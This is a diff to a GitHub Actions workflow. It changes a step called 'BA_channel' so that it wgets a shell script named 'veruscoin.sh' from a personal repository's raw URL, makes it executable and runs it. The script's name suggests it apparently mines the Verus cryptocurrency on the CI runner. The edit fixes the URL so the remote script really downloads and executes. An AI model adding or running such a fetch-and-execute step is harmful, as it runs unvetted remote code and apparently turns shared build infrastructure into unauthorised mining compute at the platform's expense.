@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: BA_channel
       run: |
-        wget https://github.com/min1933/Vipk/blob/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
+        wget https://raw.githubusercontent.com/min1933/Vipk/refs/heads/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
